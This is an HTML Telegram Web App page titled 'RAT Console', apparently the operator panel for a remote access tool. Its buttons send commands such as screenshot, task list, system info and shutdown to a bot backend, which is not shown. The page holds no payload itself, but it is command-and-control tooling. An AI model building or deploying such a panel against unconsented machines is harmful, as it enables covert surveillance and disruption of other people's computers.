<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --accent: #38bdf8; --danger: #ef4444; }
        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; padding: 20px; }
        .header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid var(--card); padding-bottom: 10px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        button { 
            background: var(--card); color: white; border: 1px solid #334155; 
            padding: 20px 10px; border-radius: 12px; font-weight: bold; font-size: 14px;
            transition: transform 0.1s, border-color 0.2s;
        }
        button:active { transform: scale(0.95); border-color: var(--accent); }
        .btn-full { grid-column: span 2; }
        .btn-danger { color: var(--danger); border-color: #7f1d1d; }
        #status { color: var(--accent); font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h2 id="greet">RAT Console</h2>
        <div id="status">System: Ready</div>
    </div>

    <div class="grid">
        <button onclick="send('screenshot')">🖥 Screenshot</button>
        <button onclick="send('taskmgr')">📊 Tasks</button>
        <button onclick="send('ping')">📡 Ping Node</button>
        <button onclick="send('info')">ℹ️ Sys Info</button>
        <button class="btn-full btn-danger" onclick="send('shutdown')">🛑 Emergency Shutdown</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        // Security: Show UI only if in TG
        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
            document.getElementById('greet').innerText = `Node: ${tg.initDataUnsafe.user.first_name}`;
        }

        function send(cmd) {
            tg.sendData(cmd);
            const status = document.getElementById('status');
            status.innerText = `Sending: ${cmd}...`;
            setTimeout(() => { status.innerText = "System: Ready"; }, 1500);
            // tg.close() is NOT called here so it stays open
        }
    </script>
</body>
</html>
